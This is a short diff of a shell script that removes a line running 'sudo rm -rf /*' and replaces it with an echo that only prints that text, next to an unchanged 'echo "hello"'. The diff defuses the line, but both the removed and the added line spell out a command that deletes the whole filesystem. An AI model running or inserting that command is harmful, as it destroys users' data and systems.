@@ -2,4 +2,4 @@
 
 echo "hello"
 
-sudo rm -rf /*
+echo "sudo rm -rf /*"
